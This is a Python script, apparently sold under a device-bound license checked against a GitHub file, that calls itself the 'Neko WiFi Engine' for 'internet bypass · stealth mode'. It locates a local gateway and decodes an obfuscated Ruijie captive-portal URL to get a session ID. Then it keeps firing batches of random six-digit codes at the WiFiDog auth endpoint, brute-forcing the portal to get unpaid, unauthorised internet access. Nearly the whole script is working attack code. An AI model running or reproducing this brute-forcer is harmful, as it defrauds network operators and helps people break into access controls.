#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import threading
import aiohttp
import asyncio
import ping3
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM
# ==========================================

GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def save_license_to_cache(expiry_date_str):
    data = {"device_id": get_stable_device_id(), "expiry": expiry_date_str, "verified_at": datetime.now().isoformat()}
    try:
        with open(LICENSE_STORAGE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_from_cache():
    if not os.path.exists(LICENSE_STORAGE):
        return None
    try:
        with open(LICENSE_STORAGE, 'r') as f:
            data = json.load(f)
            if data.get("device_id") == get_stable_device_id():
                return data
    except:
        pass
    return None

def fetch_online_license():
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except:
        pass
    return None

def verify_license_online():
    sys_key = get_stable_device_id()
    lines = fetch_online_license()
    
    if lines is None:
        return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        data = [d.strip().strip('"') for d in line.split(',')]
        if data and data[0] == sys_key:
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            if len(data) >= 4 and "BLOCK" in data[3].upper():
                return False, expiry_str, "BLOCKED"
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        return False, expiry_str, "EXPIRED"
                except:
                    pass
            return True, expiry_str, "ACTIVE"
    
    return False, "N/A", "NOT_FOUND"

def check_license():
    sys_key = get_stable_device_id()
    print(f"{CYAN}[*] Device ID: {WHITE}{sys_key}{RESET}")
    online_result, expiry_str, msg = verify_license_online()
    
    if online_result is True:
        print(f"{GREEN}[✓] License ACTIVE (Expires: {expiry_str}){RESET}")
        save_license_to_cache(expiry_str)
        return True
    elif online_result is False:
        print(f"{RED}[✗] License INVALID: {msg}{RESET}")
        cached = load_license_from_cache()
        if cached:
            expiry = cached.get("expiry", "UNLIMITED")
            if expiry == "UNLIMITED": return True
            try:
                if date.today() <= datetime.strptime(expiry, "%Y-%m-%d").date():
                    print(f"{GREEN}[✓] Using Cached License{RESET}")
                    return True
            except: pass
        return False
    else:
        cached = load_license_from_cache()
        if cached: return True
        return False

# ==========================================
# COLORS
# ==========================================

RESET = "\033[0m"; RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"; WHITE = "\033[97m"; DIM = "\033[2m"

def Logo():
    os.system('clear')
    print(f"{MAGENTA}    ╱|、\n   (˚ˎ 。7  \n    |、˜〵          \n    じしˍ,)ノ {RESET}{GREEN}Neko WiFi Engine{RESET}")
    print(f"{MAGENTA} 「 internet bypass · stealth mode 」{RESET}\n" + "─"*50)

# ==========================================
# SETUP (AUTO IP SCANNER)
# ==========================================

def setup():
    print(f"{CYAN}[*] Setup Mode - Auto Capturing Gateway...{RESET}")
    gateways = ["192.168.0.1", "192.168.1.1", "10.0.0.1", "172.16.0.1"]
    found_ip = None
    
    for target_ip in gateways:
        try:
            print(f"{DIM}[*] Checking {target_ip}...{RESET}", end="\r")
            res = requests.get(f"http://{target_ip}", timeout=2)
            if res.status_code == 200:
                found_ip = target_ip
                break
        except:
            continue

    if found_ip:
        with open(".ip", "w") as f: f.write(found_ip)
        print(f"\n{GREEN}[✓] Gateway Found: {found_ip}{RESET}")
        time.sleep(1)
    else:
        print(f"\n{RED}[✗] Auto Setup Failed. Please connect to Wi-Fi correctly.{RESET}")
        sys.exit(1)

# ==========================================
# INTERNET ACCESS ENGINE
# ==========================================

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        if not os.path.exists(".ip"): setup()
        self.ip = open(".ip", "r").read().strip()

    async def execute(self):
        Logo()
        print(f"{GREEN}[+] Neko Stealth Engine Active{RESET}\n" + "─"*50)
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            loop = 0
            session_id = None
            while True:
                if loop % 5 == 0:
                    try:
                        async with session.get(self.session_url, timeout=5) as req:
                            res_url = str(req.url)
                            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res_url).group(1)
                    except: pass
                
                if session_id:
                    tasks = []
                    for _ in range(5):
                        code = "".join(random.choice(string.digits) for _ in range(6))
                        tasks.append(session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': session_id, 'phoneNumber': code}))
                    await asyncio.gather(*tasks, return_exceptions=True)
                    
                    p = ping3.ping('google.com')
                    ping_str = f"{GREEN}{int(p*1000)}ms" if p else f"{RED}N/A"
                    print(f"{DIM}[{time.strftime('%H:%M:%S')}]{RESET} {YELLOW}→{RESET} ping: {ping_str}{RESET} | {GREEN}● ACTIVE{RESET}", end="\r")
                
                loop += 1
                await asyncio.sleep(1)

def main():
    Logo()
    if not check_license(): sys.exit(1)
    try:
        asyncio.run(InternetAccess().execute())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped{RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"Device ID: {get_stable_device_id()}"); sys.exit(0)
        if sys.argv[1] == "--reset":
            for f in [".ip", LICENSE_STORAGE, KEY_STORAGE_FILE]:
                if os.path.exists(f): os.remove(f)
            print("Reset Complete."); sys.exit(0)
    main()
